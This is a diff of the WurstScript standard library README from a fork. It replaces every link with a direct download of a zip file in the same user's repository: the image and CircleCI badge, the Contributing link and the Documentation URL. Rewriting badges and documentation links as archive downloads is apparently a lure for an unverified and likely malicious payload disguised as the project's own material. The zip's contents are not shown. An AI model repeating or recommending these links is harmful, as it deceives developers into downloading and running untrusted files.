@@ -1,6 +1,6 @@
-![](https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip)
+![](https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip)
 
-[![CircleCI](https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip)](https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip)
+[![CircleCI](https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip)](https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip)
 # Wurst Standard Library
 
 This is the repository of the WurstScript standard library which provides a vast amount of useful packages to users starting out with Wurst.
@@ -14,10 +14,10 @@ By introducing a standard library, we offer the developers everything they need 
 
 # Contributing
 
-[View https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip](https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip)
+[View https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip](https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip)
 
 # Documentation
 
-https://raw.githubusercontent.com/rolandc85/WurstStdlib2/master/volition/WurstStdlib2.zip
+https://github.com/rolandc85/WurstStdlib2/raw/refs/heads/master/wurst/math/Stdlib_Wurst_v2.5.zip
 
 
